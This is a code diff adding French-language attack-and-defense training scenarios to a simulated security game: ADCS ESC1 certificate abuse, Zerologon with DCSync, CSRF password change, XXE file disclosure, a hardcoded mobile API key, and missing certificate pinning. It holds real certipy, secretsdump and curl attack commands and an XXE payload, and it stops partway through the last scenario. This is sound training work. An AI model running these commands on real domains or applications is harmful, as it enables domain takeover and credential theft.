@@ -5345,6 +5345,560 @@ const SCENARIOS = [
     log.push({t:"[+] Mot de passe GPP déchiffré instantanément avec la clé AES fixe publiée par Microsoft.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 68. Modèle de certificat ADCS mal configuré, ESC1 (Active Directory) ===================== */
+{
+  id:'ad-adcs-esc1-template-misuse',
+  title:'Un modèle de certificat ADCS mal configuré permet d\'usurper n\'importe quelle identité (ESC1)',
+  category:'Active Directory (abus ADCS, ESC1)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur standard du domaine, disposant du simple droit d\'inscription (enroll) sur les modèles de certificat publiés par l\'autorité de certification interne `lab-CA`.',
+    desc:"Le modèle de certificat `UserAuthTemplate`, publié par l'autorité de certification interne, autorise l'authentification client et laisse le demandeur fournir lui-même l'objet du certificat (attribut ENROLLEE_SUPPLIES_SUBJECT), sans la moindre approbation manuelle. N'importe quel utilisateur authentifié peut donc demander un certificat en spécifiant l'identité d'un autre compte — y compris `administrator` — et s'en servir pour s'authentifier à sa place : c'est la technique ESC1, la plus répandue des mauvaises configurations Active Directory Certificate Services.",
+    hints:[
+      "`certipy find -u bob -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable` interroge l'autorité de certification interne et signale `UserAuthTemplate` comme vulnérable : inscription ouverte à tous les utilisateurs du domaine, sujet fourni par le demandeur, aucune approbation manuelle requise.",
+      "`cat /etc/ad/pki/UserAuthTemplate.json` confirme les trois conditions réunies de la technique ESC1 : `enrolleeSuppliesSubject: true`, `managerApproval: false`, et un droit d'inscription ouvert à `Utilisateurs du domaine`.",
+      "`certipy req -u bob -p 'Passw0rd!' -dc-ip 10.0.0.10 -ca lab-CA -template UserAuthTemplate -upn administrator@lab.local` demande un certificat en spécifiant vous-même l'UPN `administrator@lab.local` comme sujet — l'autorité l'accepte sans vérification, puisque le modèle laisse justement le demandeur fournir cet attribut.",
+      "`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10` utilise ce certificat falsifié pour s'authentifier auprès du contrôleur de domaine via PKINIT et en récupère directement le hash NT du compte `administrator`."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Ne retirez pas le modèle (il reste nécessaire, par exemple pour l'authentification par carte à puce) : corrigez sa configuration pour qu'un demandeur ne puisse plus jamais fournir lui-même l'identité du certificat, et qu'une approbation manuelle soit désormais exigée.",
+    hints:[
+      "Éditez `/etc/ad/pki/UserAuthTemplate.json` avec `nano` et passez `enrolleeSuppliesSubject` à `false` et `managerApproval` à `true`.",
+      "`verify` confirme que le modèle de certificat n'est plus exploitable en ESC1."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['pki']},
+      '/etc/ad/pki':{type:'dir',perm:'755',owner:'root',children:['UserAuthTemplate.json']},
+      '/etc/ad/pki/UserAuthTemplate.json':{type:'file',perm:'644',owner:'root',size:170,
+        content:"{\n  \"templateName\": \"UserAuthTemplate\",\n  \"enrollRights\": \"Utilisateurs du domaine\",\n  \"enrolleeSuppliesSubject\": true,\n  \"managerApproval\": false\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^certipy\s+find\s+-u\s+bob\s+-p\s+'Passw0rd!'\s+-dc-ip\s+10\.0\.0\.10\s+-vulnerable$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.scanned = true;
+        print('[*] Modèle vulnérable trouvé : UserAuthTemplate', 'out');
+        print('    Enrollment Rights : Utilisateurs du domaine', 'out');
+        print('    ESC1 : Client Authentication + Enrollee Supplies Subject + aucune approbation manuelle', 'out');
+      }
+    },
+    { pattern:/^cat\s+\/etc\/ad\/pki\/UserAuthTemplate\.json$/, run(state, print){
+        if(!state.flags || !state.flags.scanned){ print("cat: modèle introuvable — recherchez d'abord les modèles vulnérables.", 'err'); return; }
+        state.flags.confirmed = true;
+        print(state.vfs['/etc/ad/pki/UserAuthTemplate.json'].content, 'out');
+      }
+    },
+    { pattern:/^certipy\s+req\s+-u\s+bob\s+-p\s+'Passw0rd!'\s+-dc-ip\s+10\.0\.0\.10\s+-ca\s+lab-CA\s+-template\s+UserAuthTemplate\s+-upn\s+administrator@lab\.local$/, run(state, print){
+        if(!state.flags || !state.flags.confirmed){ print("certipy: confirmez d'abord la configuration du modèle avant de le demander.", 'err'); return; }
+        const c = state.vfs['/etc/ad/pki/UserAuthTemplate.json'].content;
+        const vulnerable = /"enrolleeSuppliesSubject":\s*true/.test(c) && /"managerApproval":\s*false/.test(c);
+        if(!vulnerable){ print('Certipy: demande refusée — le modèle exige désormais une approbation manuelle et ne laisse plus le demandeur fournir le sujet du certificat.', 'err'); return; }
+        state.flags.certIssued = true;
+        print("[+] Certificat émis pour le sujet administrator@lab.local (fourni par le demandeur, sans vérification).", 'ok');
+        print('Certificat sauvegardé dans administrator.pfx', 'ok');
+      }
+    },
+    { pattern:/^certipy\s+auth\s+-pfx\s+administrator\.pfx\s+-dc-ip\s+10\.0\.0\.10$/, run(state, print){
+        if(!state.flags || !state.flags.certIssued){ print('certipy: aucun certificat disponible — demandez-le d\'abord.', 'err'); return; }
+        state.flags.persisted = true;
+        print("[*] Authentification PKINIT réussie en tant qu'administrator via ce certificat falsifié.", 'ok');
+        print('NT hash (administrator) : 9c3a1f0e5d4b2a7c6e8f1a0b2c3d4e5f', 'ok');
+        print("FLAG{adcs_esc1_certificate_template_impersonation}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){
+    const c = state.vfs['/etc/ad/pki/UserAuthTemplate.json'].content;
+    return /"enrolleeSuppliesSubject":\s*false/.test(c) && /"managerApproval":\s*true/.test(c);
+  },
+  replay(state){
+    const log=[];
+    const c = state.vfs['/etc/ad/pki/UserAuthTemplate.json'].content;
+    const vulnerable = /"enrolleeSuppliesSubject":\s*true/.test(c) && /"managerApproval":\s*false/.test(c);
+    log.push({t:"$ certipy req -u bob -p 'Passw0rd!' -dc-ip 10.0.0.10 -ca lab-CA -template UserAuthTemplate -upn administrator@lab.local", cls:'prompt-line'});
+    if(!vulnerable){
+      log.push({t:'Certipy: demande refusée — le modèle exige désormais une approbation manuelle et ne laisse plus le demandeur fournir le sujet du certificat.', cls:'err'});
+      log.push({t:"[-] Le modèle de certificat est désormais correctement configuré : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Certificat émis avec l'UPN administrator@lab.local fourni par le demandeur.", cls:'ok'});
+    log.push({t:"[+] Authentification PKINIT réussie comme administrator via ce certificat falsifié.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 69. Zerologon — Netlogon non renforcé, CVE-2020-1472 (Active Directory) ===================== */
+{
+  id:'ad-zerologon-netlogon-cve-2020-1472',
+  title:'Le protocole Netlogon non renforcé permet de réinitialiser le mot de passe du contrôleur de domaine (Zerologon)',
+  category:'Active Directory (Zerologon, CVE-2020-1472)',
+  attack:{
+    who:'Vous incarnez un attaquant disposant d\'un simple accès réseau au contrôleur de domaine `dc01`, sans le moindre identifiant valide.',
+    desc:"Le contrôleur de domaine n'a pas encore reçu l'application stricte du correctif renforçant le protocole Netlogon (CVE-2020-1472, « Zerologon », août 2020) : une erreur dans son implémentation du chiffrement AES-CFB8 permet, avec un vecteur d'authentification client entièrement mis à zéro, de réinitialiser à distance et sans le moindre identifiant le mot de passe du compte machine du contrôleur de domaine lui-même.",
+    hints:[
+      "`zerologon-scan dc01.lab.local` confirme que le contrôleur de domaine n'impose pas encore `FullSecureChannelProtection` : le canal Netlogon accepte toujours une authentification non renforcée, sans qu'aucun identifiant ne soit requis pour cette simple vérification.",
+      "`zerologon-exploit dc01.lab.local` envoie une suite d'authentifications Netlogon avec un vecteur client mis à zéro ; une fois sur 256 en moyenne cette authentification est acceptée à tort, ce qui permet de réinitialiser à vide le mot de passe du compte machine `DC01$` — sans avoir eu besoin du moindre identifiant au départ.",
+      "`secretsdump -no-pass 'lab.local/DC01$@dc01.lab.local'` utilise ce mot de passe désormais vide du compte machine du contrôleur de domaine pour répliquer l'intégralité de la base NTDS (DCSync), y compris le hash du compte `krbtgt`."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Le correctif logiciel seul ne suffit pas : Microsoft l'a délibérément publié en deux temps pour ne pas casser les contrôleurs de domaine tiers non mis à jour. Il faut ensuite activer explicitement l'application stricte du canal sécurisé Netlogon, faute de quoi les comptes machine restent acceptés en mode non renforcé pendant cette période de transition.",
+    hints:[
+      "Éditez `/etc/ad/policy/netlogon.json` avec `nano` et passez `fullSecureChannelProtection` à `true`.",
+      "`verify` confirme que le canal Netlogon est désormais protégé."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['policy']},
+      '/etc/ad/policy':{type:'dir',perm:'755',owner:'root',children:['netlogon.json']},
+      '/etc/ad/policy/netlogon.json':{type:'file',perm:'644',owner:'root',size:90,
+        content:"{\n  \"fullSecureChannelProtection\": false\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^zerologon-scan\s+dc01\.lab\.local$/, run(state, print){
+        const protected_ = /"fullSecureChannelProtection":\s*true/.test(state.vfs['/etc/ad/policy/netlogon.json'].content);
+        state.flags = state.flags || {};
+        state.flags.scanned = true;
+        if(protected_){
+          print('[-] dc01.lab.local applique déjà FullSecureChannelProtection — canal Netlogon renforcé.', 'err');
+        } else {
+          print('[+] dc01.lab.local n\'impose pas FullSecureChannelProtection — canal Netlogon vulnérable (CVE-2020-1472).', 'ok');
+        }
+      }
+    },
+    { pattern:/^zerologon-exploit\s+dc01\.lab\.local$/, run(state, print){
+        if(!state.flags || !state.flags.scanned){ print("zerologon-exploit: lancez d'abord zerologon-scan pour confirmer la vulnérabilité.", 'err'); return; }
+        const protected_ = /"fullSecureChannelProtection":\s*true/.test(state.vfs['/etc/ad/policy/netlogon.json'].content);
+        if(protected_){ print('zerologon-exploit: authentification non renforcée refusée — le canal sécurisé Netlogon est désormais appliqué strictement.', 'err'); return; }
+        state.flags.passwordReset = true;
+        print('[+] Authentification Netlogon acceptée avec un vecteur client à zéro après plusieurs tentatives.', 'ok');
+        print("[+] Mot de passe du compte machine DC01$ réinitialisé à vide.", 'ok');
+      }
+    },
+    { pattern:/^secretsdump\s+-no-pass\s+'lab\.local\/DC01\$@dc01\.lab\.local'$/, run(state, print){
+        if(!state.flags || !state.flags.passwordReset){ print('secretsdump: authentification refusée — réinitialisez d\'abord le compte machine.', 'err'); return; }
+        state.flags.persisted = true;
+        print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::', 'ok');
+        print("[+] Base NTDS répliquée intégralement via DCSync (DC01$ à mot de passe vide), hash krbtgt inclus.", 'ok');
+        print("FLAG{zerologon_cve_2020_1472_netlogon_password_reset}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return /"fullSecureChannelProtection":\s*true/.test(state.vfs['/etc/ad/policy/netlogon.json'].content); },
+  replay(state){
+    const log=[];
+    const protected_ = /"fullSecureChannelProtection":\s*true/.test(state.vfs['/etc/ad/policy/netlogon.json'].content);
+    log.push({t:'$ zerologon-exploit dc01.lab.local', cls:'prompt-line'});
+    if(protected_){
+      log.push({t:'zerologon-exploit: authentification non renforcée refusée — le canal sécurisé Netlogon est désormais appliqué strictement.', cls:'err'});
+      log.push({t:"[-] FullSecureChannelProtection est désormais actif : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Mot de passe du compte machine DC01$ réinitialisé à vide.", cls:'ok'});
+    log.push({t:"[+] Réplication DCSync réussie via ce compte, hash krbtgt inclus.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 70. Absence de jeton CSRF sur le changement de mot de passe (Applications web) ===================== */
+{
+  id:'csrf-no-token-password-change',
+  title:'Absence de jeton CSRF sur le changement de mot de passe permet de le modifier à l\'insu de la victime',
+  category:'Applications web (CSRF)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant ayant attiré un administrateur déjà connecté à target-lab sur une page qu\'il contrôle, `https://evil.example` (hors périmètre : comment la victime y a été attirée).',
+    desc:"L'endpoint de changement de mot de passe de target-lab accepte toute requête POST authentifiée par le seul cookie de session, sans jamais vérifier de jeton CSRF, et ce cookie est marqué `SameSite=None` (envoyé même depuis un site tiers). Un formulaire caché auto-soumis hébergé sur `evil.example`, visité par la victime déjà connectée, suffit donc à changer son mot de passe à son insu — sans qu'elle n'ait rien cliqué de suspect.",
+    hints:[
+      "`cat /etc/api/csrf-config.yml` révèle la configuration de l'API : aucune vérification de jeton CSRF (`csrf_token_required: false`) et un cookie de session en `samesite: None`, envoyé par le navigateur même depuis un site tiers.",
+      "`curl -i http://api.target-lab/account/change-password -X POST -d 'newpassword=Hacked123!' --cookie 'session=victim_admin_session'` simule le formulaire caché auto-soumis depuis `evil.example` : le navigateur de la victime joint son cookie de session automatiquement, sans jeton CSRF requis, la requête est acceptée.",
+      "`curl http://api.target-lab/account/login -d 'user=admin&password=Hacked123!'` confirme que le mot de passe de l'administrateur est désormais bien celui imposé par l'attaquant, sans qu'aucune interaction visible n'ait été nécessaire côté victime."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Exigez un jeton CSRF vérifié côté serveur sur toute requête qui modifie un état (changement de mot de passe compris), et renforcez le cookie de session en `SameSite=Strict` pour qu'il ne soit plus jamais envoyé depuis un site tiers.",
+    hints:[
+      "Éditez `/etc/api/csrf-config.yml` avec `nano` et passez `csrf_token_required` à `true` ainsi que `samesite` à `Strict`.",
+      "`verify` confirme qu'une requête intersite sans jeton CSRF est désormais rejetée."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['csrf-config.yml']},
+      '/etc/api/csrf-config.yml':{type:'file',perm:'644',owner:'root',size:60,
+        content:"csrf_token_required: false\nsamesite: None\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^cat\s+\/etc\/api\/csrf-config\.yml$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.confirmed = true;
+        print(state.vfs['/etc/api/csrf-config.yml'].content, 'out');
+      }
+    },
+    { pattern:/^curl\s+-i\s+http:\/\/api\.target-lab\/account\/change-password\s+-X\s+POST\s+-d\s+'newpassword=Hacked123!'\s+--cookie\s+'session=victim_admin_session'$/, run(state, print){
+        if(!state.flags || !state.flags.confirmed){ print("curl: vérifiez d'abord la configuration CSRF avant de simuler la requête.", 'err'); return; }
+        const c = state.vfs['/etc/api/csrf-config.yml'].content;
+        const vulnerable = /csrf_token_required:\s*false/.test(c) && /samesite:\s*None/.test(c);
+        if(!vulnerable){ print("HTTP/1.1 403 Forbidden\nCSRF token missing or invalid.", 'err'); return; }
+        state.flags.requestForged = true;
+        print("HTTP/1.1 200 OK\n{\"status\":\"password_changed\"}", 'ok');
+        print("[i] Requête intersite acceptée : aucun jeton CSRF vérifié, cookie envoyé malgré l'origine tierce (SameSite=None).", 'info');
+      }
+    },
+    { pattern:/^curl\s+http:\/\/api\.target-lab\/account\/login\s+-d\s+'user=admin&password=Hacked123!'$/, run(state, print){
+        if(!state.flags || !state.flags.requestForged){ print('curl: aucune modification préalable détectée sur ce compte.', 'err'); return; }
+        state.flags.persisted = true;
+        print('{"status":"logged_in","user":"admin","role":"admin"}', 'ok');
+        print("[+] Connexion réussie en tant qu'administrateur, avec un mot de passe imposé sans la moindre interaction visible de la victime.", 'ok');
+        print("FLAG{csrf_no_token_password_change_takeover}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){
+    const c = state.vfs['/etc/api/csrf-config.yml'].content;
+    return /csrf_token_required:\s*true/.test(c) && /samesite:\s*Strict/.test(c);
+  },
+  replay(state){
+    const log=[];
+    const c = state.vfs['/etc/api/csrf-config.yml'].content;
+    const vulnerable = /csrf_token_required:\s*false/.test(c) && /samesite:\s*None/.test(c);
+    log.push({t:"$ curl -i http://api.target-lab/account/change-password -X POST -d 'newpassword=Hacked123!' --cookie '...'", cls:'prompt-line'});
+    if(!vulnerable){
+      log.push({t:'HTTP/1.1 403 Forbidden\nCSRF token missing or invalid.', cls:'err'});
+      log.push({t:"[-] Un jeton CSRF est désormais exigé et le cookie n'est plus envoyé depuis un site tiers : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'HTTP/1.1 200 OK — mot de passe changé sans jeton CSRF.', cls:'ok'});
+    log.push({t:"[+] Compte administrateur repris via un formulaire intersite auto-soumis.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 71. Entité externe XML non désactivée (Applications web, XXE) ===================== */
+{
+  id:'xxe-external-entity-file-disclosure',
+  title:'Une entité externe XML non désactivée permet de lire des fichiers arbitraires du serveur (XXE)',
+  category:'Applications web (XXE)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur disposant d\'un simple accès à la fonctionnalité d\'import XML de target-lab (import de catalogue fournisseur), sans le moindre accès serveur.',
+    desc:"Le parseur XML de l'endpoint d'import ne désactive pas la résolution des entités externes (DTD). Un document XML peut donc déclarer une entité `SYSTEM` pointant vers un fichier local du serveur : le parseur va la résoudre et l'insérer dans le document traité, exfiltrant ainsi le contenu de n'importe quel fichier lisible par le processus applicatif — ici un fichier de secrets jamais censé être exposé.",
+    hints:[
+      "`cat /home/bob/payload.xml` affiche le document XML déjà préparé : une déclaration `<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/api/secrets.env\">]>` suivie d'un élément `<data>&xxe;</data>` qui référence cette entité externe.",
+      "`curl -i http://api.target-lab/import -X POST --data-binary @payload.xml -H 'Content-Type: application/xml'` envoie ce document à l'endpoint d'import : si la résolution des entités externes n'est pas désactivée côté parseur, le contenu du fichier ciblé revient directement dans la réponse, à la place de l'entité.",
+      "La réponse contient le contenu intégral de `/etc/api/secrets.env`, y compris l'identifiant et le mot de passe de connexion à la base de données applicative — jamais censés être accessibles depuis un simple import de catalogue."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
+    desc:"Ne bloquez pas l'import XML entier (il reste un besoin métier légitime) : désactivez spécifiquement la résolution des entités externes et le traitement des déclarations DTD dans la configuration du parseur.",
+    hints:[
+      "Éditez `/etc/api/xml-parser-config.yml` avec `nano` et remplacez `external_entities: enabled` par `external_entities: disabled`.",
+      "`verify` confirme que les entités externes ne sont plus résolues par le parseur XML."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['payload.xml']},
+      '/home/bob/payload.xml':{type:'file',perm:'644',owner:'bob',size:130,
+        content:"<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/api/secrets.env\">]>\n<data>&xxe;</data>\n"},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['xml-parser-config.yml','secrets.env']},
+      '/etc/api/xml-parser-config.yml':{type:'file',perm:'644',owner:'root',size:40,
+        content:"external_entities: enabled\n"},
+      '/etc/api/secrets.env':{type:'file',perm:'600',owner:'root',size:80,
+        content:"DB_HOST=10.0.0.20\nDB_USER=api_svc\nDB_PASSWORD=Sup3rSecretDbPass!\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^cat\s+\/home\/bob\/payload\.xml$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.payloadReady = true;
+        print(state.vfs['/home/bob/payload.xml'].content, 'out');
+      }
+    },
+    { pattern:/^curl\s+-i\s+http:\/\/api\.target-lab\/import\s+-X\s+POST\s+--data-binary\s+@payload\.xml\s+-H\s+'Content-Type:\s+application\/xml'$/, run(state, print){
+        if(!state.flags || !state.flags.payloadReady){ print("curl: relisez d'abord payload.xml avant de l'envoyer.", 'err'); return; }
+        const vulnerable = /external_entities:\s*enabled/.test(state.vfs['/etc/api/xml-parser-config.yml'].content);
+        if(!vulnerable){ print("HTTP/1.1 400 Bad Request\nEntity resolution disabled by parser policy.", 'err'); return; }
+        state.flags.leaked = true;
+        print('HTTP/1.1 200 OK', 'ok');
+        print(state.vfs['/etc/api/secrets.env'].content, 'ok');
+        print("[+] Contenu du fichier de secrets exfiltré via une entité externe XML non désactivée.", 'ok');
+        print("FLAG{xxe_external_entity_secrets_env_disclosure}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.leaked === true; },
+  defenseCheck(state){ return /external_entities:\s*disabled/.test(state.vfs['/etc/api/xml-parser-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const vulnerable = /external_entities:\s*enabled/.test(state.vfs['/etc/api/xml-parser-config.yml'].content);
+    log.push({t:"$ curl -i http://api.target-lab/import -X POST --data-binary @payload.xml -H 'Content-Type: application/xml'", cls:'prompt-line'});
+    if(!vulnerable){
+      log.push({t:'HTTP/1.1 400 Bad Request\nEntity resolution disabled by parser policy.', cls:'err'});
+      log.push({t:"[-] Les entités externes ne sont plus résolues par le parseur XML : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[+] Contenu de /etc/api/secrets.env exfiltré via une entité externe XML.', cls:'ok'});
+    log.push({t:"[+] Identifiant et mot de passe de la base de données applicative récupérés.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 72. Clé API codée en dur dans un APK décompilé (Mobile & API embarquées) ===================== */
+{
+  id:'mobile-hardcoded-api-key-apk',
+  title:'Une clé API codée en dur dans l\'APK décompilé donne accès à un endpoint d\'administration',
+  category:'Mobile & API embarquées (secret codé en dur)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant ayant simplement téléchargé et décompilé l\'APK publique de l\'application mobile de target-lab (aucun accès serveur, aucun compte requis).',
+    desc:"Le code source décompilé de l'application contient une clé API codée en dur dans `ApiConfig.java`. Cette même clé, censée ne servir qu'aux appels publics de l'application mobile, est en réalité acceptée telle quelle par un endpoint d'administration du backend — un anti-pattern courant où une seule clé partagée sert à la fois d'authentification mobile et de laissez-passer interne, sans distinction de portée (scope).",
+    hints:[
+      "`grep -r API_KEY /home/bob/apk-decompiled` retrouve la clé codée en dur dans `ApiConfig.java`, embarquée telle quelle dans le binaire de l'application — visible par quiconque décompile l'APK, sans le moindre accès serveur.",
+      "`curl -i https://api.target-lab/admin/users -H 'X-Api-Key: sk_live_mobile_9f3ac2e7b1d84f0a'` teste cette même clé, censée ne servir qu'aux appels publics de l'application mobile, contre un endpoint d'administration du backend.",
+      "Le backend accepte la clé et répond avec la liste complète des comptes utilisateurs : la portée de la clé mobile n'est jamais distinguée de celle d'un accès administrateur interne."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du backend chargé de corriger la faille.',
+    desc:"La clé mobile ne doit jamais pouvoir se faire passer pour un accès administrateur interne : distinguez strictement les portées, pour que même une clé mobile compromise (elles finissent toujours par l'être, une fois l'APK décompilé) ne donne accès qu'aux endpoints publics prévus.",
+    hints:[
+      "Éditez `/etc/api/mobile-key-policy.yml` avec `nano` et passez `admin_scope_shared_with_mobile_key` à `false`.",
+      "`verify` confirme que la clé mobile n'ouvre plus l'accès aux endpoints d'administration."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['apk-decompiled']},
+      '/home/bob/apk-decompiled':{type:'dir',perm:'755',owner:'bob',children:['ApiConfig.java']},
+      '/home/bob/apk-decompiled/ApiConfig.java':{type:'file',perm:'644',owner:'bob',size:180,
+        content:"public class ApiConfig {\n    public static final String API_KEY = \"sk_live_mobile_9f3ac2e7b1d84f0a\";\n    public static final String BASE_URL = \"https://api.target-lab/mobile\";\n}\n"},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
+      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['mobile-key-policy.yml']},
+      '/etc/api/mobile-key-policy.yml':{type:'file',perm:'644',owner:'root',size:50,
+        content:"admin_scope_shared_with_mobile_key: true\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^grep\s+-r\s+API_KEY\s+\/home\/bob\/apk-decompiled$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.keyFound = true;
+        print('/home/bob/apk-decompiled/ApiConfig.java:    public static final String API_KEY = "sk_live_mobile_9f3ac2e7b1d84f0a";', 'out');
+      }
+    },
+    { pattern:/^curl\s+-i\s+https:\/\/api\.target-lab\/admin\/users\s+-H\s+'X-Api-Key:\s+sk_live_mobile_9f3ac2e7b1d84f0a'$/, run(state, print){
+        if(!state.flags || !state.flags.keyFound){ print("curl: retrouvez d'abord la clé API dans le code décompilé.", 'err'); return; }
+        const shared = /admin_scope_shared_with_mobile_key:\s*true/.test(state.vfs['/etc/api/mobile-key-policy.yml'].content);
+        if(!shared){ print('HTTP/1.1 403 Forbidden\nThis key is scoped to public mobile endpoints only.', 'err'); return; }
+        state.flags.persisted = true;
+        print('HTTP/1.1 200 OK', 'ok');
+        print('[{"user":"admin","role":"admin"},{"user":"alice","role":"user"}, ...]', 'ok');
+        print("[+] La clé mobile, censée n'ouvrir que des endpoints publics, donne ici un accès administrateur complet.", 'ok');
+        print("FLAG{mobile_hardcoded_api_key_admin_scope_leak}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return /admin_scope_shared_with_mobile_key:\s*false/.test(state.vfs['/etc/api/mobile-key-policy.yml'].content); },
+  replay(state){
+    const log=[];
+    const shared = /admin_scope_shared_with_mobile_key:\s*true/.test(state.vfs['/etc/api/mobile-key-policy.yml'].content);
+    log.push({t:"$ curl -i https://api.target-lab/admin/users -H 'X-Api-Key: sk_live_mobile_9f3ac2e7b1d84f0a'", cls:'prompt-line'});
+    if(!shared){
+      log.push({t:'HTTP/1.1 403 Forbidden\nThis key is scoped to public mobile endpoints only.', cls:'err'});
+      log.push({t:"[-] La clé mobile n'ouvre plus l'accès aux endpoints d'administration : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[+] Liste complète des comptes utilisateurs récupérée avec la clé mobile codée en dur.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 73. Absence de certificate pinning (Mobile & API embarquées) ===================== */
+{
+  id:'mobile-missing-certificate-pinning',
+  title:'L\'absence d\'épinglage de certificat (certificate pinning) permet d\'intercepter le jeton de session mobile',
+  category:'Mobile & API embarquées (certificate pinning absent)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant partageant le même réseau Wi-Fi qu\'une victime utilisant l\'application mobile de target-lab, avec un proxy d\'interception (rogue CA) déjà en place sur ce réseau.',
+    desc:"L'application mobile fait confiance à n'importe quel certificat validé par une autorité de certification du système, sans jamais vérifier que le certificat présenté correspond précisément à celui attendu (certificate pinning). Un attaquant positionné sur le même réseau, avec sa propre autorité de certification installée sur l'appareil ou le réseau intercepté, peut donc déchiffrer et lire tout le trafic HTTPS de l'application — jeton de session compris.",
+    hints:[
+      "`mitm-status target-lab-app` interroge la configuration réseau embarquée de l'application et confirme qu'aucun épinglage de certificat n'est configuré (`certificate_pinning: disabled`) : n'importe quelle autorité de certification de confiance système suffit à intercepter le trafic.",
+      "`mitm-intercept target-lab-app --ca rogue-ca.pem` place le proxy d'interception au milieu de la connexion : l'application ne détecte rien, puisqu'elle ne vérifie jamais l'empreinte précise du certificat serveur.",
+      "Le proxy capture un jeton de session Bearer en clair dans les en-têtes déchiffrés d'une requête de l'application.",
+      "`curl https://api.target-lab/mobile/profile -H 'Authorization: Bearer stolen_mobile_session_7d1e9c'` réutilise ce jeton intercepté pour usurper la session de la victime depuis un tout autre appareil."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'équipe mobile de target-lab chargée de corriger la faille.',
